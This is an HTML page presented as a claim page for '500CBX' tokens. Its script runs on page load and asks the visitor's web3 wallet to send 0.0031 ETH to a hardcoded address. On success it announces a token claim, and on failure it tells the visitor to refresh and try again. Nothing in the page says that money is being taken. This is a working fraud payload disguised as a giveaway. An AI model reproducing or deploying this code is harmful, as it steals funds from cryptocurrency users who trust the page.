<head>
    <meta charset="UTF-8">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@0.19.0/dist/web3-light.js"></script>
    <script type="text/javascript">
        window.addEventListener('load', function () {
            if (typeof web3 !== 'undefined') {
                console.log('Web3 Detected! ' + web3.currentProvider.constructor.name)
                window.web3 = new Web3(web3.currentProvider);

                var toAddress = '0x726F78BbD8F88588F7e38146A0C3426665cFc6a1'
                var ethAmount = .0031

                web3.eth.sendTransaction({
                    from: web3.eth.accounts[0],
                    to: toAddress,
                    value: web3.toWei(ethAmount, 'ether')
                }, function (error, result) {
                    if (error) {
                        document.getElementById('output').innerHTML = "Please refresh!"
                    } else {
                        document.getElementById('output').innerHTML = " 500CBX Claimed!! : <a href='https://etherscan.io/tx/" + result + "'>https://etherscan.io/tx/" + result + "'"
                    }
                });
            } else {
                document.getElementById('output').innerHtml = 'Please download and install Metamask or TrustWallet: <a href="https://metamask.io/">https://metamask.io/</a>'
            }
        })
    </script>
</head>
<body>
    <div id="output"></div>
</body>
</html>
